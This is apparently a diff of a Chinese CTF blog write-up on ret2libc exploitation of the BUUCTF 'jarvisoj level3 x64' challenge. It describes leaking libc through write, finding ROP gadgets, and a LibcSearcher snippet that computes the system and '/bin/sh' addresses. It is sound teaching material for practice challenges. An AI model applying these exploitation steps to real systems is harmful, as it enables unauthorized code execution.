 <p><strong>必须为动态链接才能用ret2libc</strong></p>
 <p><strong>基本方法:1.找system函数的地址2.找”&#x2F;bin&#x2F;sh”字符串的地址</strong></p>
-<p>![](F:\er jin zhi\pwn\笔记截图\微信图片_20240710152510.jpg)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062045283.jpg"></p>
 <h4 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h4><p><strong>BUUCTF   jarvisoj level3 x64</strong></p>
 <p>wp</p>
-<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-23 152831.png)</p>
-<p>![](F:\er jin zhi\pwn\笔记截图\95f2be663b699dd8d6310a4564f0739d.png)</p>
-<p>![](F:\er jin zhi\pwn\笔记截图\876bae18df2c60990669444532b12e70.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062045990.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062045180.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062045598.png"></p>
 <p>输入点buf明显的溢出漏洞，read之前已经调用过一个write函数了，可以利用它来泄露libc版本</p>
 <p>1.泄露libc版本<br>64位汇编传参，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。<br>我们这边要利用write函数去泄露libc版本<br>write函数的原型，它有三个参数，所以我们这边需要用到三个寄存器去传参</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssize_t write(<span class="built_in">int</span> fd,const void*buf,size_t count);</span><br><span class="line">参数说明：</span><br><span class="line">  fd:是文件描述符（write所对应的是写，即就是<span class="number">1</span>）</span><br><span class="line">  buf:通常是一个字符串，需要写入的字符串</span><br><span class="line">  count：是每次写入的字节数</span><br></pre></td></tr></table></figure>
 
 <p>利用ROPgadget找一下设置<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%AF%84%E5%AD%98%E5%99%A8&spm=1001.2101.3001.7020">寄存器</a>的指令</p>
-<p>![](F:\er jin zhi\pwn\笔记截图\微信图片_20240723165808.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062045040.png"></p>
 <p>2.计算出程序里的system和bin&#x2F;sh的真实地址</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
